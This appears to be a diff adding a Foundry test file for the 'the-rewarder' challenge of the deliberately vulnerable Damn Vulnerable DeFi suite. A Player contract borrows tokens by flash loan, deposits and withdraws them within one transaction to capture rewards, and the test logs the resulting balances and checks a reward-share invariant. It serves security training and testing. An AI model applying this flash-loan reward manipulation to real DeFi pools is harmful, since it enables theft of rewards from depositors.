@@ -1,0 +1,142 @@
+// @dev to run: ./toggle_forge_files.sh enable contracts/the-rewarder; forge test --match-path contracts/the-rewarder/Test.forge.sol -vvv
+
+pragma solidity ^0.8.0;
+
+import "forge-std/console.sol";
+import { Test } from "forge-std/Test.sol";
+
+import { DamnValuableToken } from "../DamnValuableToken.sol";
+import { TheRewarderPool } from "./TheRewarderPool.sol";
+import { AccountingToken } from "./AccountingToken.sol";
+import { RewardToken } from "./RewardToken.sol";
+import { FlashLoanerPool } from "./FlashLoanerPool.sol";
+
+contract Player {
+  DamnValuableToken public liquidityToken;
+  TheRewarderPool public rewarderPool;
+  FlashLoanerPool public flashLoanerPool;
+  constructor (address _liquidityTokenAddress, address _rewarderPoolAddress, address _flashLoanerPoolAddress) {
+    liquidityToken = DamnValuableToken(_liquidityTokenAddress);
+    rewarderPool = TheRewarderPool(_rewarderPoolAddress);
+    flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
+  }
+
+  function doDeposit(uint256 _amount) public {
+    liquidityToken.approve(address(rewarderPool), _amount);
+    rewarderPool.deposit(_amount);
+  }
+
+  function doWithdraw(uint256 _amount) public {
+    rewarderPool.withdraw(_amount);
+  }
+
+  function doDistributeRewards() public {
+    rewarderPool.distributeRewards();
+  }
+
+  function doFlashLoan(uint256 _amount) public {
+    flashLoanerPool.flashLoan(_amount);
+  }
+
+  function receiveFlashLoan(uint256 _amount) public {
+    doDeposit(_amount);
+    console.log("the player does deposit");
+    AccountingToken accToken = rewarderPool.accToken();
+    RewardToken rewardToken = rewarderPool.rewardToken();
+    console.log("accToken balance of the current player", accToken.balanceOf(address(this)));
+    console.log("rewardToken balance of the current player", rewardToken.balanceOf(address(this)));
+    doWithdraw(_amount);    
+    console.log("the player does withdraw");
+    console.log("accToken balance of the current player", accToken.balanceOf(address(this)));
+    console.log("rewardToken balance of the current player", rewardToken.balanceOf(address(this)));
+    liquidityToken.transfer(address(flashLoanerPool), _amount);
+  }
+}
+
+contract TheRewarderTest is Test{
+  DamnValuableToken public liquidityToken;
+  TheRewarderPool public rewarderPool;
+  AccountingToken public accToken;
+  RewardToken public rewardToken;
+  FlashLoanerPool public flashLoanerPool;
+
+  Player public player1;
+  Player public player2;
+
+  address public deployer = address(0x10000);
+  address public sender = address(0x11111);
+
+  constructor() payable {    
+    
+    liquidityToken = new DamnValuableToken();
+    rewarderPool = new TheRewarderPool(address(liquidityToken));
+    
+    accToken = rewarderPool.accToken();
+    rewardToken = rewarderPool.rewardToken();
+    
+
+    flashLoanerPool = new FlashLoanerPool(address(liquidityToken));
+
+    player1 = new Player(address(liquidityToken), address(rewarderPool), address(flashLoanerPool));
+    player2 = new Player(address(liquidityToken), address(rewarderPool), address(flashLoanerPool));
+    
+    liquidityToken.transfer(address(flashLoanerPool), 5000000 ether);
+    liquidityToken.transfer(address(player1), 0.0001 ether);
+    liquidityToken.transfer(address(player2), 1 ether);
+  
+    // // deposit_rewarder_pool            
+    // player1.doDeposit(1 ether);
+    // console.log("player1 balance", liquidityToken.balanceOf(address(player1)));
+    // assert(accToken.balanceOf(address(player1)) == 1 ether);
+    // assert(rewardToken.balanceOf(address(player1)) == 0);
+
+    player2.doDeposit(1 ether);
+    console.log("player2 balance", liquidityToken.balanceOf(address(player2)));
+    console.log("accToken balance of player2", accToken.balanceOf(address(player2)));
+    console.log("rewardToken balance of player2", rewardToken.balanceOf(address(player2)));
+  }
+
+  function players_call_distribute_rewards() public {
+    player1.doDistributeRewards();
+    player2.doDistributeRewards();
+  }
+
+  function player1_doWithdraw(uint256 _amount) public {
+    player1.doWithdraw(_amount);
+  }
+
+  function player1_doDeposit(uint256 _amount) public {
+    player1.doDeposit(_amount);
+  }
+
+  function player1_doFlashLoan(uint256 _amount) public {
+    player1.doFlashLoan(_amount);
+  }
+
+  function check_reward_token_balance() public {    
+    players_call_distribute_rewards();
+    assert( rewardToken.balanceOf(address(player1)) * 11 <= rewardToken.totalSupply() * 10 );
+    // assert(rewardToken.balanceOf(address(player1)) <= rewardToken.balanceOf(address(player2)));
+  }
+
+  function test_flashloan_func() public {
+    vm.warp(block.timestamp + 6 days);
+
+    players_call_distribute_rewards();
+    console.log("accToken balance of player2:   ", accToken.balanceOf(address(player2)));
+    console.log("rewardToken balance of player2:", rewardToken.balanceOf(address(player2)));
+
+    vm.warp(block.timestamp + 6 days);
+
+    console.log("++ player1 is doing flashloan");    
+    player1_doFlashLoan(10 ether);
+    console.log("accToken balance of player1:   ", accToken.balanceOf(address(player1)));
+    console.log("rewardToken balance of player1:", rewardToken.balanceOf(address(player1)));
+    console.log("accToken balance of player2:   ", accToken.balanceOf(address(player2)));
+    console.log("rewardToken balance of player2:", rewardToken.balanceOf(address(player2)));
+
+    console.log("rewardToken total supply:      ", rewardToken.totalSupply() );
+
+  }
+
+}
